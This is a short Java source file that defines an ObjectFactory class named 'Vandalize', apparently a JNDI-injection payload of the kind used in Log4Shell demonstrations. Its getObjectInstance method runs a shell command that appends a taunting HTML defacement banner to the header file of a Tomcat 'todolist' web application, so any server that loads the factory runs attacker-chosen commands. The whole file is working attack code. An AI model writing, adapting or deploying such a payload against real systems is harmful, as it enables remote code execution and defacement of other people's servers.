import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Vandalize implements  ObjectFactory  {
    @Override
    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        String[] cmd = {
                "/bin/sh",
                "-c",
                "echo '<center><h1>Nice container you have, I think I will move in!</h1></center>' >> /usr/local/tomcat/webapps/todolist/WEB-INF/views/common/header.jspf"};
        Runtime.getRuntime().exec(cmd);
        return  null;
    }
}
